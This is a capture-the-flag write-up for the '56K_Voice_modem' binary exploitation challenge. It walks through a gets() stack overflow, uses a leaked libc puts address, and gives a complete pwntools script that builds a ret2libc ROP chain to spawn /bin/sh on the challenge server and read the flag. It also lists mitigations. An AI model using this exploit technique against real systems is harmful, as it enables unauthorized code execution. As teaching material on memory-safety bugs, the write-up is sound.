# 56K Voice Modem

## Challenge Information
- **Category**: Binary Exploitation / PWN
- **Challenge**: 56K_Voice_modem
- **Remote**: 51.210.244.18:54557

## Overview
This challenge presents a classic buffer overflow vulnerability in a simulated 56K modem connection binary. The program leaks a libc address and accepts user input via the unsafe `gets()` function, allowing us to perform a Return-Oriented Programming (ROP) attack.

## Initial Analysis

### Binary Protections
Running `pwn checksec` reveals the following protections:
```
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

Key observations:
- **No Stack Canary**: Buffer overflow is possible without triggering canary checks
- **NX Enabled**: We cannot execute shellcode on the stack, must use ROP
- **No PIE**: Binary addresses are static, but we still need libc addresses
- **Not Stripped**: Function names are available for easier analysis

### Program Behavior
When running the binary, we see:
```
--- USRobotics 56K Voice Winmodem (v1.33.7) ---
Connection starting...
[DEBUG] Firmware diagnostic at : 0x77e507687be0
AT+ID?
User: hello
Connection try for : hello...
Refused. Disconnection.
```

The program conveniently leaks a libc address (`puts` address) labeled as "Firmware diagnostic".

## Vulnerability Analysis

### The `login()` Function
Disassembling the `login()` function reveals the vulnerability:

```asm
0x004011f7   mov rax, qword [reloc.puts]      ; Load puts address
0x004011fe   mov rsi, rax
0x00401201   lea rax, "[DEBUG] Firmware diagnostic at : %p\n"
0x00401208   mov rdi, rax
0x0040120b   mov eax, 0
0x00401210   call printf                       ; Leak puts address
...
0x00401238   lea rax, [rbp-0x40]              ; Buffer at rbp-0x40
0x0040123c   mov rdi, rax
0x0040123f   mov eax, 0
0x00401244   call gets                         ; VULNERABLE: gets() with no bounds checking
```

**Key Findings:**
1. The buffer is located at `rbp-0x40` (64 bytes from base pointer)
2. The `gets()` function is used without any input length validation
3. A `puts` address from libc is leaked via `printf`

### Calculating the Offset
The buffer is at `rbp-0x40`:
- Buffer size: 64 bytes
- Saved RBP: 8 bytes
- **Total offset to return address: 72 bytes**

## Exploitation Strategy

### Attack Plan
1. **Parse the leaked `puts` address** from the debug output
2. **Calculate libc base address** using the known `puts` offset
3. **Build a ROP chain** to call `system("/bin/sh")`
4. **Overflow the buffer** with our payload

### ROP Chain Construction
Since NX is enabled, we need to use ROP to execute our attack:

```python
# ROP gadgets needed:
pop_rdi = libc_base + rop.find_gadget(["pop rdi", "ret"]).address
ret = libc_base + rop.find_gadget(["ret"]).address
bin_sh = libc_base + next(libc.search(b"/bin/sh\x00"))
system = libc_base + libc.symbols["system"]
exit_ = libc_base + libc.symbols["exit"]
```

The ROP chain:
1. `ret` gadget (for stack alignment)
2. `pop rdi; ret` to load `/bin/sh` into RDI
3. Address of `/bin/sh` string
4. `system()` function
5. `exit()` for clean termination

## Exploit Implementation

```python
#!/usr/bin/env python3
from pathlib import Path
from pwn import *

ROOT = Path(__file__).resolve().parent
context.binary = elf = ELF(str(ROOT / "challenge"))
libc = ELF(str(ROOT / "libc.so.6"))
context.log_level = "info"

def start():
    if args.REMOTE:
        return remote("51.210.244.18", 54557)
    return process(elf.path)

def main():
    io = start()

    # Step 1: Parse the leaked puts address
    io.recvuntil(b"diagnostic at : ")
    leak = io.recvline().strip()
    puts_addr = int(leak, 16)
    libc_base = puts_addr - libc.symbols["puts"]
    
    log.info(f"Leaked puts: {hex(puts_addr)}")
    log.info(f"Libc base: {hex(libc_base)}")

    # Step 2: Build ROP chain
    rop = ROP(libc)
    pop_rdi = libc_base + rop.find_gadget(["pop rdi", "ret"]).address
    ret = libc_base + rop.find_gadget(["ret"]).address
    bin_sh = libc_base + next(libc.search(b"/bin/sh\x00"))
    system = libc_base + libc.symbols["system"]
    exit_ = libc_base + libc.symbols["exit"]

    # Step 3: Construct payload
    payload = b"A" * 72              # Fill buffer + saved RBP
    payload += p64(ret)              # Stack alignment
    payload += p64(pop_rdi)          # pop rdi; ret
    payload += p64(bin_sh)           # "/bin/sh" string address
    payload += p64(system)           # system() function
    payload += p64(exit_)            # exit() for clean exit

    # Step 4: Send payload
    io.recvuntil(b"User: ")
    io.sendline(payload)

    # Step 5: Get the flag
    if args.REMOTE:
        io.sendline(b"cat flag.txt")
        data = io.recvall(timeout=3)
        print(data.decode(errors="ignore"))
        return

    io.interactive()

if __name__ == "__main__":
    main()
```

## Running the Exploit

### Local Testing
```bash
python3 solve.py
```

### Remote Exploitation
```bash
python3 solve.py REMOTE
```

## Key Takeaways

1. **Information Leaks are Critical**: The leaked `puts` address makes ASLR bypass trivial
2. **Never Use `gets()`**: This function is inherently unsafe and should never be used
3. **Stack Alignment Matters**: The extra `ret` gadget ensures proper stack alignment for modern libc
4. **ROP Chain Order**: Proper ordering of gadgets is crucial for successful exploitation

## Mitigation
To prevent this vulnerability:
- Replace `gets()` with `fgets()` or other bounded input functions
- Enable stack canaries (`-fstack-protector-all`)
- Enable PIE to randomize binary addresses
- Don't leak sensitive addresses in debug messages
- Use modern compiler protections

## Flag
Successfully exploiting this challenge retrieves the flag from the remote server.
